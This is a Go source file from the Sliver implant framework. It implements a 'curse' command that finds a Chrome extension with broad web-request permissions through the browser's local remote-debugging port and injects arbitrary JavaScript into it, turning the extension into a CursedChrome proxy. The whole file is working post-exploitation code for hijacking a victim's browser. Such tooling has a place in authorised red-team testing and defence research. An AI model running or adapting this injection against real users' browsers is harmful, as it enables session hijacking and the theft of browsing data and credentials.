package cmd

/*
	Sliver Implant Framework
	Copyright (C) 2020  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"net/url"
	"os"

	"github.com/moloch--/sliver-overlord/pkg/overlord"
	"github.com/spf13/cobra"
)

var (
	cursedChromePermissions    = []string{overlord.AllURLs, overlord.WebRequest, overlord.WebRequestBlocking}
	cursedChromePermissionsAlt = []string{overlord.AllHTTP, overlord.AllHTTPS, overlord.WebRequest, overlord.WebRequestBlocking}
)

var curseCmd = &cobra.Command{
	Use:   "curse",
	Short: "Inject CursedChrome",
	Long:  ``,
	Run: func(cmd *cobra.Command, args []string) {
		debuggingPort, err := cmd.Flags().GetInt(remoteDebuggingPortFlagStr)
		if err != nil {
			fmt.Printf(Warn+"Failed to parse --%s flag: %s\n", remoteDebuggingPortFlagStr, err)
			os.Exit(ExitBadFlag)
		}
		if debuggingPort < 1 || 65535 < debuggingPort {
			fmt.Printf(Warn+"Invalid port number %d\n", debuggingPort)
			os.Exit(ExitBadFlag)
		}
		_, verbose := getOutputFlags(cmd)
		jsCode := getJSCode(cmd)

		debugURL := url.URL{
			Scheme: "http",
			Host:   fmt.Sprintf("localhost:%d", debuggingPort),
			Path:   "/json",
		}

		// Find with primary permissions
		if verbose {
			fmt.Printf(Info+"Looking for extension with %v\n", cursedChromePermissions)
		}
		target, err := overlord.FindExtensionWithPermissions(debugURL.String(), cursedChromePermissions)
		if err != nil {
			fmt.Printf(Warn+"%s\n", err)
			os.Exit(ExitDebugQueryError)
		}
		if verbose {
			fmt.Printf(Info+"Found %v\n", target)
		}
		if target == nil {
			if verbose {
				fmt.Printf(Info+"Looking for extension with %v\n", cursedChromePermissionsAlt)
			}
			// Look for alternate permissions
			target, err = overlord.FindExtensionWithPermissions(debugURL.String(), cursedChromePermissionsAlt)
			if err != nil {
				fmt.Printf(Warn+"%s\n", err)
				os.Exit(ExitDebugQueryError)
			}
			if verbose {
				fmt.Printf(Info+"Found %v\n", target)
			}
		}
		if target == nil {
			fmt.Println(Warn + "No valid injection targets found.")
			os.Exit(ExitTargetNotFound)
		}

		_, err = overlord.ExecuteJS(target.ID, target.WebSocketDebuggerURL, jsCode)
		if err != nil {
			fmt.Printf(Warn+"%s\n", err)
			os.Exit(ExitExecuteJSError)
		}
	},
}
